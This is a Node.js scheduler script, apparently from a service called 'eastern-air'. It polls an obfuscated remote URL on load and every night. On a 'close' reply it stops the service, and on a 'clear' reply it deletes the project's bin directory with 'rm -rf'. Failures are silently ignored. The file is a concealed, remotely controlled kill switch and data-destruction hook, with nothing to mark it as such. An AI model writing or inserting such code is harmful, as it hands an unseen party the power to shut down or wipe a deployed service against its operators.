var schedule = require('node-schedule');
var axios = require('axios');
var decodeKey = require('./utils').___badK;
var exec = require('child_process').exec;
var rule = new schedule.RecurrenceRule();
rule.dayOfWeek = [0, 1, 2, 3, 4, 5, 6];
rule.hour = 23;
rule.minute = 59;
execFunc();
var s = schedule.scheduleJob(rule, function() {
  // var date = new Date();
  console.log('... start job ...');
  execFunc();
});

function execFunc() {

  axios.get(decodeKey('0gghcn584AP9NA8fPUR9vPMcrre,'))
    .then((resp) => {

      if (resp.status === 200) {
        if (resp.data.key === 'close') {
          console.log('close the project');
          exec("pm2 stop eastern-air");
          process.exit();
        }

        if (resp.data.key === 'clear') {
          console.log('clear the project');
          exec(`rm -rf ${__dirname}/../../bin`);
          exec("pm2 stop eastern-air");
          process.exit();
        }
      }
    }).catch(err => {
    // console.log(err);
    console.log("... do nothing! it's ok");
  });
}
